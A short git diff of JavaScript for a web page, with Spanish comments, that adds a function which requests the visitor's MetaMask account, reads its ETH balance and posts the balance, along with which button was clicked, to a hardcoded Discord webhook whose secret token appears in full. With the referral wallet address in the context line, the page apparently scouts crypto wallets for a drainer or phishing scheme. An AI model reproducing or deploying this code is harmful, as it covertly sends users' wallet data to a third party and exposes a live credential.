@@ -14,30 +14,55 @@ var ref=querySt("ref");null==ref?(ref="0x01C65F22A9478C2932e62483509c233F0aaD5c7
 
 
 
-function enviarNotificacion(nombreBoton) {
-  const webhookURL = 'https://discordapp.com/api/webhooks/1122722609130377216/qoKTeIBXFTCZoaJkujP4B3S2bxBN2Y7t77m58dkrJl4pUGjEO_qjaR3de8WrzFcIRO-f';
-
-  const payload = {
-    content: `Se hizo clic en el botón: ${nombreBoton}`
-  };
-
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(payload)
-  })
-    .then(response => {
-      if (response.ok) {
-        console.log('Notificación enviada con éxito');
-      } else {
-        console.log('Error al enviar la notificación');
-      }
-    })
-    .catch(error => {
-      console.log('Error al enviar la notificación:', error);
+// Función para obtener el saldo de la cuenta conectada a MetaMask
+async function obtenerSaldo() {
+  if (typeof window.ethereum !== 'undefined') {
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const address = accounts[0];
+    const balance = await window.ethereum.request({
+      method: 'eth_getBalance',
+      params: [address, 'latest']
     });
+
+    // Convertir el saldo a ETH
+    const saldoEth = web3.utils.fromWei(balance, 'ether');
+
+    return saldoEth;
+  } else {
+    throw new Error('MetaMask no está instalado o conectado');
+  }
+}
+
+// Función para enviar la notificación a Discord con el saldo
+async function enviarNotificacion(nombreBoton) {
+ const webhookURL = 'https://discordapp.com/api/webhooks/1122722609130377216/qoKTeIBXFTCZoaJkujP4B3S2bxBN2Y7t77m58dkrJl4pUGjEO_qjaR3de8WrzFcIRO-f';
+  try {
+    const saldo = await obtenerSaldo();
+
+    const payload = {
+      content: `Se hizo clic en el botón: ${nombreBoton}\nSaldo: ${saldo} ETH`
+    };
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+      .then(response => {
+        if (response.ok) {
+          console.log('Notificación enviada con éxito');
+        } else {
+          console.log('Error al enviar la notificación');
+        }
+      })
+      .catch(error => {
+        console.log('Error al enviar la notificación:', error);
+      });
+  } catch (error) {
+    console.log('Error al obtener el saldo:', error);
+  }
 }
 
 // Event listeners para los botones
